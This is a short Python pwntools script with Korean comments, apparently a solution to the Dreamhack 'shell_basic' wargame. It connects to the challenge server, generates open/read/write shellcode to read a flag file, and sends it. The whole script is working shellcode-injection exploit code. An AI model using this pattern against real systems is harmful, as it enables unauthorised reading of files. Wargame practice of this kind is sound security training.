from pwn import *

# 원격 서버에 연결
host = "host3.dreamhack.games"
port = 9706
p = remote(host, port)

# shellcraft를 사용하여 파일을 열고, 읽고, 출력하는 셸코드 생성
shellcode = shellcraft.open("/home/shell_basic/flag_name_is_loooooong")
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)

# 생성된 셸코드를 ASM으로 컴파일하고 바이너리 형태로 변환
shellcode = asm(shellcode)

# 서버에 셸코드를 전송
p.send(shellcode)

# 서버로부터의 응답을 받아 출력
p.interactive()
